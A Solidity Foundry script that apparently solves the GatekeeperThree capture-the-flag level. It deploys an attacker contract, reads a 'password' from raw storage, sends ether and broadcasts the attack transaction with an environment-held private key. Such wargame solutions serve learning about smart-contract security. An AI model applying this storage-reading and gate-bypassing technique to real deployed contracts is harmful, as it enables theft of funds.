// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Attacker.sol";

contract GatekeeperThreeTest is Test {
    address payable gatekeeperThreeAddress = payable(0xb1566837fC1CCe28cA06F129A2f00d4602161ce4);
    

    function test() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(gatekeeperThreeAddress); 
        GatekeeperThree gatekeeperThree = GatekeeperThree(gatekeeperThreeAddress);
        address trickAddress = address(gatekeeperThree.trick());
        uint password = uint(vm.load(trickAddress, bytes32(uint(2)))); //slot number 2

        gatekeeperThreeAddress.transfer(0.001000000001 ether);
        attacker.attack();
        vm.stopBroadcast();
    }
}
